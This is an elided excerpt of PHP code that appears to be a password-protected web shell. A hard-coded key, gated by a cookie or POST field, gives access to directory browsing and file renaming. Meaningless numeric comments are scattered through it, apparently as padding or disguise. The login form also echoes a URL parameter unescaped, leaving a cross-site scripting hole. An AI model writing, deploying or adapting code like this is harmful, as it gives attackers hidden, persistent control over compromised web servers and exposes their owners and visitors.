...
$auth_key = "a3f8b20f0527158cc57080414b065815";
...
$pass = false;
if (isset($_COOKIE['pw_name_99500'])) {
    if(($_COOKIE['pw_name_99500']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_99500'])) {
        if(($_POST['pw_name_99500']) == $auth_key) {
            setcookie("pw_name_99500", $_POST['pw_name_99500']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_99500' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724425408788034 1724425408720797 1724425408937109 1724425408262276
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724425408788034 1724425408720797 1724425408937109 1724425408262276
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724425408788034 1724425408720797 1724425408937109 1724425408262276
            $name = PATH . "/" . $_GET['r'];
